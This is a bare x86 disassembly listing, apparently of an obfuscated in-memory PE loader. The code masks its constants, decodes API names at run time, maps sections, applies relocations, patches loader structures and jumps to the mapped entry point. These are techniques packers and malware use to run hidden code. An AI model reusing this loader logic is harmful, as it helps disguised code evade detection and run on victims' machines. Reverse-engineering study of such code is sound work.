  42605f:	mov    eax,DWORD PTR [ebp-0x4]
  426062:	mov    esi,DWORD PTR [ebp+0x8]
  426065:	mov    ecx,0x75108b1
  42606a:	xor    eax,ecx
  42606c:	mov    edx,0x3272f8
  426071:	add    eax,edx
  426073:	cmp    esi,eax
  426075:	je     0x42619c
  42607b:	mov    eax,DWORD PTR [ebp+0x8]
  42607e:	mov    esi,DWORD PTR [ebp+0x8]
  426081:	add    esi,DWORD PTR [eax+0x3c]
  426084:	push   edi
  426085:	mov    DWORD PTR [ebp+0xc],esi
  426088:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  42608f:	mov    eax,DWORD PTR [ebp-0x1c]
  426092:	mov    esi,DWORD PTR [ebp-0x4]
  426095:	mov    edi,DWORD PTR [ebp+0xc]
  426098:	xor    esi,ecx
  42609a:	xor    eax,ecx
  42609c:	add    esi,edx
  42609e:	cmp    DWORD PTR [edi+eax*8+0x1939838],esi
  4260a5:	je     0x426196
  4260ab:	mov    esi,DWORD PTR [ebp+0xc]
  4260ae:	mov    eax,DWORD PTR [ebp+0x8]
  4260b1:	add    eax,DWORD PTR [esi+0xa0]
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	mov    edi,DWORD PTR [ebp+0xc]
  4260bd:	sub    esi,DWORD PTR [edi+0x34]
  4260c0:	mov    edi,DWORD PTR [ebp-0x4]
  4260c3:	xor    edi,ecx
  4260c5:	add    edi,edx
  4260c7:	mov    DWORD PTR [ebp-0x24],esi
  4260ca:	cmp    esi,edi
  4260cc:	je     0x426196
  4260d2:	mov    esi,DWORD PTR [ebp-0x4]
  4260d5:	xor    esi,ecx
  4260d7:	add    esi,edx
  4260d9:	mov    DWORD PTR [ebp-0x8],esi
  4260dc:	push   ebx
  4260dd:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4260e4:	jmp    0x426180
  4260e9:	mov    esi,DWORD PTR [ebp-0x4]
  4260ec:	xor    esi,ecx
  4260ee:	lea    edi,[ebx-0x8]
  4260f1:	add    esi,edx
  4260f3:	shr    edi,1
  4260f5:	cmp    esi,edi
  4260f7:	jae    0x426166
  4260f9:	sub    edi,esi
  4260fb:	lea    ebx,[eax+esi*2+0x8]
  4260ff:	mov    DWORD PTR [ebp-0x18],edi
  426102:	movzx  esi,WORD PTR [ebx]
  426105:	and    esi,0xfff
  42610b:	mov    DWORD PTR [ebp-0x14],esi
  42610e:	mov    edi,DWORD PTR [ebp-0x14]
  426111:	mov    esi,DWORD PTR [eax]
  426113:	sub    esi,edx
  426115:	add    edi,esi
  426117:	movzx  esi,WORD PTR [ebx]
  42611a:	shr    esi,0xc
  42611d:	xor    edi,ecx
  42611f:	mov    DWORD PTR [ebp-0x20],edi
  426122:	mov    DWORD PTR [ebp-0x14],esi
  426125:	mov    esi,DWORD PTR [ebp-0x20]
  426128:	mov    edi,DWORD PTR [ebp+0x8]
  42612b:	xor    esi,ecx
  42612d:	lea    esi,[esi+edi*1+0x3272f8]
  426134:	mov    DWORD PTR [ebp-0x20],esi
  426137:	mov    esi,DWORD PTR [ebp-0x10]
  42613a:	mov    edi,DWORD PTR [ebp-0x14]
  42613d:	xor    esi,ecx
  42613f:	add    esi,edx
  426141:	cmp    edi,esi
  426143:	jne    0x42615b
  426145:	mov    esi,DWORD PTR [ebp-0x10]
  426148:	mov    edi,DWORD PTR [ebp-0x14]
  42614b:	xor    esi,ecx
  42614d:	add    esi,edx
  42614f:	cmp    edi,esi
  426151:	jne    0x42615b
  426153:	mov    esi,DWORD PTR [ebp-0x20]
  426156:	mov    edi,DWORD PTR [ebp-0x24]
  426159:	add    DWORD PTR [esi],edi
  42615b:	add    ebx,0x2
  42615e:	dec    DWORD PTR [ebp-0x18]
  426161:	jne    0x426102
  426163:	mov    ebx,DWORD PTR [ebp-0xc]
  426166:	add    DWORD PTR [ebp-0x8],ebx
  426169:	mov    esi,DWORD PTR [ebp-0x1c]
  42616c:	mov    edi,DWORD PTR [ebp-0x8]
  42616f:	mov    ebx,DWORD PTR [ebp+0xc]
  426172:	xor    esi,ecx
  426174:	cmp    edi,DWORD PTR [ebx+esi*8+0x193983c]
  42617b:	jae    0x426195
  42617d:	add    eax,DWORD PTR [ebp-0xc]
  426180:	mov    esi,DWORD PTR [ebp-0x4]
  426183:	mov    ebx,DWORD PTR [eax+0x4]
  426186:	xor    esi,ecx
  426188:	add    esi,edx
  42618a:	mov    DWORD PTR [ebp-0xc],ebx
  42618d:	cmp    ebx,esi
  42618f:	jne    0x4260e9
  426195:	pop    ebx
  426196:	mov    eax,DWORD PTR [ebp-0x28]
  426199:	pop    edi
  42619a:	jmp    0x42619f
  42619c:	mov    eax,DWORD PTR [ebp-0x4]
  42619f:	xor    eax,ecx
  4261a1:	add    eax,edx
  4261a3:	pop    esi
  4261a4:	leave  
  4261a5:	ret    0x8
  4261a8:	push   ebp
  4261a9:	mov    ebp,esp
  4261ab:	sub    esp,0xd8
  4261b1:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  4261b8:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  4261bf:	mov    eax,DWORD PTR [ebp-0x4]
  4261c2:	push   ebx
  4261c3:	push   esi
  4261c4:	mov    esi,0x75108b1
  4261c9:	xor    eax,esi
  4261cb:	push   edi
  4261cc:	mov    edi,0x3272f8
  4261d1:	add    eax,edi
  4261d3:	mov    DWORD PTR [ebp-0x18],eax
  4261d6:	mov    eax,DWORD PTR [ebp-0x4]
  4261d9:	xor    eax,esi
  4261db:	add    eax,edi
  4261dd:	mov    DWORD PTR [ebp-0x8],eax
  4261e0:	mov    ebx,DWORD PTR [ebp+0x20]
  4261e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4261e9:	xor    eax,ecx
  4261eb:	mov    DWORD PTR [ebp-0x1c],eax
  4261ee:	add    DWORD PTR [ebp-0x1c],0xf89cb5b9
  4261f5:	mov    eax,DWORD PTR [ebp-0xc]
  4261f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4261fb:	xor    eax,ecx
  4261fd:	mov    DWORD PTR [ebp-0xc],eax
  426200:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  426207:	mov    eax,DWORD PTR [ebp-0x10]
  42620a:	mov    ecx,DWORD PTR [ebp-0x10]
  42620d:	xor    eax,ecx
  42620f:	mov    DWORD PTR [ebp-0x10],eax
  426212:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  426219:	mov    eax,DWORD PTR [ebp-0x28]
  42621c:	mov    ecx,DWORD PTR [ebp-0x28]
  42621f:	xor    eax,ecx
  426221:	mov    DWORD PTR [ebp-0x28],eax
  426224:	add    DWORD PTR [ebp-0x28],0xf89f05b9
  42622b:	mov    DWORD PTR [ebp+0x20],0xf89cefe4
  426232:	mov    eax,DWORD PTR [ebp+0x8]
  426235:	test   eax,eax
  426237:	je     0x4266be
  42623d:	mov    eax,DWORD PTR [ebp+0xc]
  426240:	test   eax,eax
  426242:	je     0x4266be
  426248:	mov    eax,DWORD PTR [ebp+0x18]
  42624b:	test   eax,eax
  42624d:	je     0x4266be
  426253:	mov    eax,DWORD PTR [ebp+0x20]
  426256:	mov    ecx,DWORD PTR [ebp+0x8]
  426259:	xor    eax,0x8b1
  42625e:	add    eax,0x72f8
  426263:	cmp    WORD PTR [ecx],ax
  426266:	jne    0x4266be
  42626c:	mov    eax,DWORD PTR [ebp-0x4]
  42626f:	xor    eax,esi
  426271:	add    eax,edi
  426273:	mov    DWORD PTR [ebp-0x30],eax
  426276:	mov    eax,DWORD PTR [ebp-0x4]
  426279:	mov    ecx,DWORD PTR [ebp+0x8]
  42627c:	mov    eax,DWORD PTR [ebp+0x8]
  42627f:	add    eax,DWORD PTR [ecx+0x3c]
  426282:	mov    DWORD PTR [ebp+0xc],eax
  426285:	mov    eax,DWORD PTR [eax+0x50]
  426288:	test   eax,eax
  42628a:	je     0x4266be
  426290:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  426297:	mov    eax,DWORD PTR [ebp-0x2c]
  42629a:	xor    eax,esi
  42629c:	add    eax,edi
  42629e:	mov    DWORD PTR [ebp-0x2c],eax
  4262a1:	mov    eax,DWORD PTR [ebp-0x4]
  4262a4:	mov    eax,DWORD PTR [ebx+0x190]
  4262aa:	mov    ecx,DWORD PTR [eax]
  4262ac:	mov    ecx,DWORD PTR [ecx+0x3c]
  4262af:	add    ecx,DWORD PTR [eax]
  4262b1:	mov    eax,DWORD PTR [ebp-0x4]
  4262b4:	mov    eax,DWORD PTR [ebx+0x18c]
  4262ba:	mov    edx,DWORD PTR [eax]
  4262bc:	mov    DWORD PTR [ebp-0x20],ecx
  4262bf:	mov    DWORD PTR [ebp+0x20],edx
  4262c2:	cmp    edx,edx
  4262c4:	jne    0x4262f8
  4262c6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4262cc:	lea    edx,[ebp-0x18]
  4262cf:	push   edx
  4262d0:	mov    edx,DWORD PTR [ebp-0xc]
  4262d3:	xor    edx,esi
  4262d5:	add    edx,edi
  4262d7:	push   edx
  4262d8:	push   DWORD PTR [ecx+0x50]
  4262db:	push   DWORD PTR [ebp+0x20]
  4262de:	call   DWORD PTR [eax+0x1c]
  4262e1:	mov    eax,DWORD PTR [ebp-0x20]
  4262e4:	mov    ecx,DWORD PTR [eax+0x54]
  4262e7:	mov    eax,DWORD PTR [eax+0x50]
  4262ea:	sub    eax,ecx
  4262ec:	add    ecx,DWORD PTR [ebp+0x20]
  4262ef:	push   ecx
  4262f0:	call   0x426c5b
  4262f5:	mov    edx,DWORD PTR [ebp+0x20]
  4262f8:	mov    eax,DWORD PTR [ebx+0x194]
  4262fe:	mov    DWORD PTR [eax],edx
  426300:	mov    eax,DWORD PTR [ebp+0xc]
  426303:	push   DWORD PTR [eax+0x54]
  426306:	push   DWORD PTR [ebp+0x8]
  426309:	push   edx
  42630a:	call   0x426b51
  42630f:	mov    ecx,DWORD PTR [ebp+0x20]
  426312:	mov    eax,DWORD PTR [ecx+0x3c]
  426315:	add    eax,ecx
  426317:	movzx  ecx,WORD PTR [eax+0x14]
  42631b:	lea    ecx,[ecx+eax*1+0x18]
  42631f:	mov    DWORD PTR [ebp+0x18],ecx
  426322:	mov    ecx,DWORD PTR [ebp-0x4]
  426325:	movzx  edx,WORD PTR [eax+0x6]
  426329:	xor    ecx,esi
  42632b:	add    ecx,edi
  42632d:	mov    DWORD PTR [ebp+0xc],eax
  426330:	cmp    edx,ecx
  426332:	je     0x4263df
  426338:	mov    ecx,DWORD PTR [ebp-0x4]
  42633b:	xor    ecx,esi
  42633d:	add    ecx,edi
  42633f:	mov    DWORD PTR [ebp-0x8],ecx
  426342:	mov    ecx,DWORD PTR [ebp-0x24]
  426345:	movzx  edx,WORD PTR [eax+0x6]
  426349:	xor    ecx,esi
  42634b:	sub    edx,ecx
  42634d:	sub    edx,edi
  42634f:	cmp    DWORD PTR [ebp-0x8],edx
  426352:	ja     0x4263df
  426358:	mov    edx,DWORD PTR [ebp+0x18]
  42635b:	add    edx,0x8
  42635e:	mov    DWORD PTR [ebp+0x18],edx
  426361:	jmp    0x426366
  426363:	mov    edx,DWORD PTR [ebp+0x18]
  426366:	mov    eax,DWORD PTR [eax+0x38]
  426369:	lea    ecx,[eax-0x1]
  42636c:	mov    DWORD PTR [ebp-0x38],eax
  42636f:	mov    eax,DWORD PTR [edx]
  426371:	test   eax,ecx
  426373:	je     0x42637c
  426375:	not    ecx
  426377:	and    eax,ecx
  426379:	add    eax,DWORD PTR [ebp-0x38]
  42637c:	mov    ecx,DWORD PTR [edx+0x4]
  42637f:	add    ecx,DWORD PTR [ebp+0x20]
  426382:	push   ecx
  426383:	call   0x426c5b
  426388:	mov    edx,DWORD PTR [ebp-0x4]
  42638b:	mov    eax,DWORD PTR [ebp+0x18]
  42638e:	mov    ecx,DWORD PTR [eax+0x8]
  426391:	xor    edx,esi
  426393:	add    edx,edi
  426395:	cmp    ecx,edx
  426397:	je     0x4263b0
  426399:	push   ecx
  42639a:	mov    ecx,DWORD PTR [ebp+0x8]
  42639d:	add    ecx,DWORD PTR [eax+0xc]
  4263a0:	mov    eax,DWORD PTR [eax+0x4]
  4263a3:	add    eax,DWORD PTR [ebp+0x20]
  4263a6:	push   ecx
  4263a7:	push   eax
  4263a8:	call   0x426b51
  4263ad:	mov    eax,DWORD PTR [ebp+0x18]
  4263b0:	mov    ecx,DWORD PTR [ebp-0x24]
  4263b3:	mov    edx,DWORD PTR [ebp-0x8]
  4263b6:	add    eax,0x28
  4263b9:	xor    ecx,esi
  4263bb:	lea    ecx,[edx+ecx*1+0x3272f8]
  4263c2:	mov    edx,DWORD PTR [ebp+0xc]
  4263c5:	mov    DWORD PTR [ebp+0x18],eax
  4263c8:	mov    eax,DWORD PTR [ebp-0x24]
  4263cb:	movzx  edx,WORD PTR [edx+0x6]
  4263cf:	xor    eax,esi
  4263d1:	sub    edx,eax
  4263d3:	mov    eax,DWORD PTR [ebp+0xc]
  4263d6:	sub    edx,edi
  4263d8:	mov    DWORD PTR [ebp-0x8],ecx
  4263db:	cmp    ecx,edx
  4263dd:	jbe    0x426363
  4263df:	mov    edx,DWORD PTR [ebx+0x18c]
  4263e5:	mov    ecx,DWORD PTR [ebp+0x20]
  4263e8:	cmp    ecx,DWORD PTR [edx]
  4263ea:	jne    0x426413
  4263ec:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263f2:	lea    edx,[ebp-0x18]
  4263f5:	push   edx
  4263f6:	mov    edx,DWORD PTR [ebp-0x10]
  4263f9:	xor    edx,esi
  4263fb:	add    edx,edi
  4263fd:	push   edx
  4263fe:	mov    edx,DWORD PTR [ebp-0x20]
  426401:	push   DWORD PTR [edx+0x54]
  426404:	push   ecx
  426405:	call   DWORD PTR [eax+0x1c]
  426408:	test   eax,eax
  42640a:	je     0x4266af
  426410:	mov    eax,DWORD PTR [ebp+0xc]
  426413:	mov    ecx,DWORD PTR [ebx+0x1c8]
  426419:	mov    ecx,DWORD PTR [ecx]
  42641b:	xor    ecx,esi
  42641d:	add    ecx,edi
  42641f:	je     0x4265da
  426425:	mov    eax,DWORD PTR [ebp-0x4]
  426428:	xor    eax,esi
  42642a:	add    eax,edi
  42642c:	and    DWORD PTR [ebp+0x8],0x0
  426430:	mov    DWORD PTR [ebp-0x14],eax
  426433:	mov    eax,0xf89c85dd
  426438:	lea    ecx,[eax-0x18]
  42643b:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  426442:	mov    DWORD PTR [ebp-0x54],0xf89c85cd
  426449:	mov    DWORD PTR [ebp-0x50],eax
  42644c:	mov    DWORD PTR [ebp-0x4c],ecx
  42644f:	mov    DWORD PTR [ebp-0x48],ecx
  426452:	mov    DWORD PTR [ebp-0x44],0xf89c85b9
  426459:	mov    edx,DWORD PTR [ebp+0x8]
  42645c:	mov    ecx,0x8b1
  426461:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  426466:	mov    edx,0x72f8
  42646b:	add    cx,dx
  42646e:	mov    edx,DWORD PTR [ebp+0x8]
  426471:	inc    DWORD PTR [ebp+0x8]
  426474:	cmp    DWORD PTR [ebp+0x8],0x6
  426478:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426480:	jb     0x426459
  426482:	mov    ecx,0xf89c85cb
  426487:	mov    DWORD PTR [ebp-0xb0],eax
  42648d:	mov    DWORD PTR [ebp-0x9c],eax
  426493:	mov    DWORD PTR [ebp-0x74],eax
  426496:	mov    DWORD PTR [ebp-0x70],eax
  426499:	lea    eax,[ecx-0x1]
  42649c:	lea    edx,[ecx+0x34]
  42649f:	mov    DWORD PTR [ebp-0x64],eax
  4264a2:	mov    DWORD PTR [ebp-0x60],eax
  4264a5:	mov    DWORD PTR [ebp-0xb4],0xf89c85e5
  4264af:	mov    DWORD PTR [ebp-0xac],ecx
  4264b5:	mov    DWORD PTR [ebp-0xa8],edx
  4264bb:	mov    DWORD PTR [ebp-0xa4],0xf89c85c0
  4264c5:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  4264cf:	mov    DWORD PTR [ebp-0x98],0xf89c85fc
  4264d9:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  4264e3:	mov    DWORD PTR [ebp-0x90],0xf89c85cd
  4264ed:	mov    DWORD PTR [ebp-0x8c],ecx
  4264f3:	mov    DWORD PTR [ebp-0x88],0xf89c8530
  4264fd:	mov    DWORD PTR [ebp-0x84],edx
  426503:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  42650a:	mov    DWORD PTR [ebp-0x7c],ecx
  42650d:	mov    DWORD PTR [ebp-0x78],0xf89c85f8
  426514:	mov    DWORD PTR [ebp-0x6c],ecx
  426517:	mov    DWORD PTR [ebp-0x68],0xf89c85dc
  42651e:	mov    DWORD PTR [ebp-0x5c],0xf89c85b9
  426525:	xor    eax,eax
  426527:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  42652e:	xor    cl,0xb1
  426531:	sub    cl,0x8
  426534:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42653b:	inc    eax
  42653c:	cmp    eax,0x17
  42653f:	jb     0x426527
  426541:	mov    eax,DWORD PTR [ebx+0x1e0]
  426547:	lea    ecx,[ebp-0xc0]
  42654d:	push   ecx
  42654e:	call   DWORD PTR [eax+0x4]
  426551:	mov    ecx,DWORD PTR [ebx+0x1e0]
  426557:	lea    edx,[ebp-0xd8]
  42655d:	push   edx
  42655e:	push   eax
  42655f:	call   DWORD PTR [ecx+0x8]
  426562:	mov    DWORD PTR [ebp-0x40],eax
  426565:	lea    eax,[ebp-0x14]
  426568:	push   eax
  426569:	mov    eax,DWORD PTR [ebx+0x18c]
  42656f:	push   DWORD PTR [eax]
  426571:	mov    eax,DWORD PTR [ebp-0x40]
  426574:	call   eax
  426576:	mov    eax,DWORD PTR [ebp-0x4]
  426579:	xor    eax,esi
  42657b:	add    eax,edi
  42657d:	mov    DWORD PTR [ebp-0x34],eax
  426580:	mov    ecx,DWORD PTR [ebp-0x4]
  426583:	mov    eax,DWORD PTR [ebp-0x14]
  426586:	xor    ecx,esi
  426588:	add    ecx,edi
  42658a:	cmp    eax,ecx
  42658c:	je     0x4265d7
  42658e:	mov    DWORD PTR [ebp-0x3c],eax
  426591:	jmp    0x4265a2
  426593:	mov    eax,DWORD PTR [eax]
  426595:	mov    ecx,DWORD PTR [ebp-0x3c]
  426598:	mov    DWORD PTR [ebp-0x14],eax
  42659b:	mov    eax,DWORD PTR [ebp-0x14]
  42659e:	cmp    eax,ecx
  4265a0:	je     0x4265af
  4265a2:	mov    edx,DWORD PTR [eax+0x18]
  4265a5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265ab:	cmp    edx,DWORD PTR [ecx]
  4265ad:	jne    0x426593
  4265af:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265b5:	mov    edx,DWORD PTR [eax+0x18]
  4265b8:	cmp    edx,DWORD PTR [ecx]
  4265ba:	jne    0x4265d7
  4265bc:	mov    ecx,DWORD PTR [ebx+0x190]
  4265c2:	mov    edx,DWORD PTR [ebp-0x20]
  4265c5:	mov    edx,DWORD PTR [edx+0x28]
  4265c8:	add    edx,DWORD PTR [ecx]
  4265ca:	mov    DWORD PTR [eax+0x1c],edx
  4265cd:	mov    eax,DWORD PTR [ebp-0x24]
  4265d0:	xor    eax,esi
  4265d2:	add    eax,edi
  4265d4:	mov    DWORD PTR [ebp-0x34],eax
  4265d7:	mov    eax,DWORD PTR [ebp+0xc]
  4265da:	push   ebx
  4265db:	push   eax
  4265dc:	push   DWORD PTR [ebp+0x20]
  4265df:	call   0x425d5f
  4265e4:	test   eax,eax
  4265e6:	je     0x4266af
  4265ec:	push   DWORD PTR [ebp+0xc]
  4265ef:	mov    ecx,ebx
  4265f1:	push   DWORD PTR [ebp+0x20]
  4265f4:	call   0x425cb8
  4265f9:	test   eax,eax
  4265fb:	je     0x4266af
  426601:	mov    eax,DWORD PTR [ebp+0xc]
  426604:	mov    edx,DWORD PTR [ebp+0x20]
  426607:	mov    ecx,ebx
  426609:	call   0x425b91
  42660e:	test   eax,eax
  426610:	je     0x4266af
  426616:	push   ebx
  426617:	push   DWORD PTR [ebp+0x20]
  42661a:	call   0x426042
  42661f:	test   eax,eax
  426621:	je     0x4266af
  426627:	mov    eax,DWORD PTR [ebx+0x18c]
  42662d:	mov    edx,DWORD PTR [ebp+0x20]
  426630:	cmp    edx,DWORD PTR [eax]
  426632:	jne    0x42664e
  426634:	mov    eax,DWORD PTR [ebx+0x1e0]
  42663a:	lea    ecx,[ebp-0x18]
  42663d:	push   ecx
  42663e:	push   DWORD PTR [ebp-0x18]
  426641:	mov    ecx,DWORD PTR [ebp-0x20]
  426644:	push   DWORD PTR [ecx+0x54]
  426647:	push   edx
  426648:	call   DWORD PTR [eax+0x1c]
  42664b:	mov    edx,DWORD PTR [ebp+0x20]
  42664e:	mov    eax,DWORD PTR [ebx+0x1c8]
  426654:	mov    eax,DWORD PTR [eax]
  426656:	xor    eax,esi
  426658:	add    eax,edi
  42665a:	je     0x426693
  42665c:	mov    ecx,DWORD PTR [ebp+0xc]
  42665f:	mov    eax,DWORD PTR [ecx+0x28]
  426662:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  426669:	mov    esi,DWORD PTR [ebp+0x8]
  42666c:	push   DWORD PTR [ebp+0x14]
  42666f:	xor    esi,0x8b1
  426675:	push   DWORD PTR [ebp+0x10]
  426678:	add    esi,0x72f8
  42667e:	or     WORD PTR [ecx+0x16],si
  426682:	add    eax,edx
  426684:	push   edx
  426685:	call   eax
  426687:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  426691:	jmp    0x42669d
  426693:	mov    eax,DWORD PTR [ebp+0xc]
  426696:	mov    eax,DWORD PTR [eax+0x28]
  426699:	add    eax,edx
  42669b:	call   eax
  42669d:	mov    DWORD PTR [ebp-0x8],eax
  4266a0:	mov    eax,DWORD PTR [ebp-0x8]
  4266a3:	mov    ecx,DWORD PTR [ebp+0x1c]
  4266a6:	mov    DWORD PTR [ecx],eax
  4266a8:	mov    DWORD PTR [ebp-0x30],0x1
  4266af:	cmp    DWORD PTR [ebp-0x30],0x0
  4266b3:	jne    0x4266b9
  4266b5:	and    DWORD PTR [ebp+0x20],0x0
  4266b9:	mov    eax,DWORD PTR [ebp+0x20]
  4266bc:	jmp    0x4266c0
  4266be:	xor    eax,eax
  4266c0:	pop    edi
  4266c1:	pop    esi
  4266c2:	pop    ebx
  4266c3:	leave  
  4266c4:	ret    0x1c
  4266c7:	push   ebp
  4266c8:	mov    ebp,esp
  4266ca:	movzx  edx,WORD PTR [ecx+0x6]
  4266ce:	movzx  eax,WORD PTR [ecx+0x14]
  4266d2:	push   ebx
  4266d3:	push   edi
  4266d4:	xor    edi,edi
  4266d6:	lea    eax,[eax+ecx*1+0x18]
  4266da:	test   edx,edx
  4266dc:	je     0x4266fd
  4266de:	mov    ecx,DWORD PTR [eax+0xc]
  4266e1:	lea    ebx,[ecx+esi*1]
  4266e4:	cmp    DWORD PTR [ebp+0x8],ebx
  4266e7:	jb     0x4266f5
  4266e9:	mov    ebx,DWORD PTR [eax+0x8]
  4266ec:	add    ebx,ecx
  4266ee:	add    ebx,esi
  4266f0:	cmp    DWORD PTR [ebp+0x8],ebx
  4266f3:	jb     0x4266ff
  4266f5:	add    eax,0x28
  4266f8:	inc    edi
  4266f9:	cmp    edi,edx
  4266fb:	jb     0x4266de
  4266fd:	xor    eax,eax
  4266ff:	pop    edi
  426700:	pop    ebx
  426701:	pop    ebp
  426702:	ret    0x4
  426705:	push   ebp
  426706:	mov    ebp,esp
  426708:	sub    esp,0x34
  42670b:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  426712:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426719:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  426720:	mov    DWORD PTR [ebp-0x8],0xf89c85d8
  426727:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  42672e:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  426735:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  42673c:	mov    DWORD PTR [ebp-0x10],eax
  42673f:	mov    eax,DWORD PTR [ebp+0x8]
  426742:	mov    DWORD PTR [ebp-0x14],eax
  426745:	mov    eax,DWORD PTR [ebp-0xc]
  426748:	push   ebx
  426749:	mov    ecx,0x75108b1
  42674e:	xor    eax,ecx
  426750:	push   esi
  426751:	mov    esi,DWORD PTR [ebp-0x10]
  426754:	mov    edx,0x3272f8
  426759:	add    eax,edx
  42675b:	push   edi
  42675c:	cmp    esi,eax
  42675e:	je     0x42693d
  426764:	mov    eax,DWORD PTR [ebp-0xc]
  426767:	mov    esi,DWORD PTR [ebp-0x14]
  42676a:	xor    eax,ecx
  42676c:	add    eax,edx
  42676e:	cmp    esi,eax
  426770:	je     0x42693d
  426776:	mov    eax,DWORD PTR [ebp-0xc]
  426779:	xor    eax,ecx
  42677b:	add    eax,edx
  42677d:	mov    DWORD PTR [ebp-0x24],eax
  426780:	mov    eax,DWORD PTR [ebp-0xc]
  426783:	xor    eax,ecx
  426785:	add    eax,edx
  426787:	mov    DWORD PTR [ebp-0x28],eax
  42678a:	mov    edi,DWORD PTR [ebp-0x20]
  42678d:	mov    ebx,DWORD PTR [ebp-0x8]
  426790:	mov    esi,0x8b1
  426795:	xor    edi,esi
  426797:	mov    eax,0x72f8
  42679c:	xor    ebx,esi
  42679e:	add    edi,eax
  4267a0:	add    ebx,eax
  4267a2:	sub    ebx,edi
  4267a4:	mov    WORD PTR [ebp-0x8],bx
  4267a8:	jmp    0x42686d
  4267ad:	mov    edi,DWORD PTR [ebp-0xc]
  4267b0:	mov    bx,WORD PTR [ebp-0x4]
  4267b4:	xor    edi,esi
  4267b6:	add    edi,eax
  4267b8:	cmp    bx,di
  4267bb:	je     0x4268af
  4267c1:	mov    edi,DWORD PTR [ebp-0xc]
  4267c4:	mov    ebx,DWORD PTR [ebp+0xc]
  4267c7:	xor    edi,ecx
  4267c9:	add    edi,edx
  4267cb:	cmp    ebx,edi
  4267cd:	mov    di,WORD PTR [ebp-0x4]
  4267d1:	mov    bx,WORD PTR [ebp+0x8]
  4267d5:	je     0x426840
  4267d7:	cmp    bx,di
  4267da:	je     0x426849
  4267dc:	mov    edi,DWORD PTR [ebp-0x20]
  4267df:	mov    bx,WORD PTR [ebp+0x8]
  4267e3:	xor    edi,esi
  4267e5:	add    edi,eax
  4267e7:	cmp    bx,di
  4267ea:	jb     0x42680a
  4267ec:	mov    edi,DWORD PTR [ebp-0x2c]
  4267ef:	mov    bx,WORD PTR [ebp+0x8]
  4267f3:	xor    edi,esi
  4267f5:	add    edi,eax
  4267f7:	cmp    bx,di
  4267fa:	ja     0x42680a
  4267fc:	movzx  edi,WORD PTR [ebp+0x8]
  426800:	movzx  ebx,WORD PTR [ebp-0x8]
  426804:	add    edi,ebx
  426806:	mov    WORD PTR [ebp+0x8],di
  42680a:	mov    edi,DWORD PTR [ebp-0x20]
  42680d:	mov    bx,WORD PTR [ebp-0x4]
  426811:	xor    edi,esi
  426813:	add    edi,eax
  426815:	cmp    bx,di
  426818:	jb     0x426838
  42681a:	mov    edi,DWORD PTR [ebp-0x2c]
  42681d:	mov    bx,WORD PTR [ebp-0x4]
  426821:	xor    edi,esi
  426823:	add    edi,eax
  426825:	cmp    bx,di
  426828:	ja     0x426838
  42682a:	movzx  edi,WORD PTR [ebp-0x4]
  42682e:	movzx  ebx,WORD PTR [ebp-0x8]
  426832:	add    edi,ebx
  426834:	mov    WORD PTR [ebp-0x4],di
  426838:	mov    di,WORD PTR [ebp-0x4]
  42683c:	mov    bx,WORD PTR [ebp+0x8]
  426840:	cmp    bx,di
  426843:	jne    0x42693d
  426849:	mov    edi,DWORD PTR [ebp-0x1c]
  42684c:	mov    ebx,DWORD PTR [ebp-0x10]
  42684f:	xor    edi,ecx
  426851:	lea    edi,[edi+ebx*1+0x3272f8]
  426858:	mov    DWORD PTR [ebp-0x10],edi
  42685b:	mov    edi,DWORD PTR [ebp-0x1c]
  42685e:	mov    ebx,DWORD PTR [ebp-0x14]
  426861:	xor    edi,ecx
  426863:	lea    edi,[edi+ebx*1+0x3272f8]
  42686a:	mov    DWORD PTR [ebp-0x14],edi
  42686d:	mov    edi,DWORD PTR [ebp-0x24]
  426870:	mov    ebx,DWORD PTR [ebp-0x10]
  426873:	mov    di,WORD PTR [ebx+edi*2]
  426877:	mov    WORD PTR [ebp+0x8],di
  42687b:	mov    edi,DWORD PTR [ebp-0x28]
  42687e:	mov    ebx,DWORD PTR [ebp-0x14]
  426881:	mov    di,WORD PTR [ebx+edi*2]
  426885:	mov    WORD PTR [ebp-0x4],di
  426889:	mov    edi,DWORD PTR [ebp-0xc]
  42688c:	mov    bx,WORD PTR [ebp+0x8]
  426890:	xor    edi,esi
  426892:	add    edi,eax
  426894:	cmp    bx,di
  426897:	jne    0x4267ad
  42689d:	mov    eax,DWORD PTR [ebp-0x18]
  4268a0:	mov    esi,DWORD PTR [ebp-0xc]
  4268a3:	xor    eax,ecx
  4268a5:	add    eax,edx
  4268a7:	imul   eax,esi
  4268aa:	mov    DWORD PTR [ebp-0xc],eax
  4268ad:	jmp    0x4268c1
  4268af:	mov    eax,DWORD PTR [ebp-0xc]
  4268b2:	mov    esi,DWORD PTR [ebp-0x18]
  4268b5:	xor    eax,ecx
  4268b7:	lea    eax,[eax+esi*1+0x3272f8]
  4268be:	mov    DWORD PTR [ebp-0x18],eax
  4268c1:	mov    eax,DWORD PTR [ebp-0x24]
  4268c4:	sub    eax,edx
  4268c6:	xor    eax,ecx
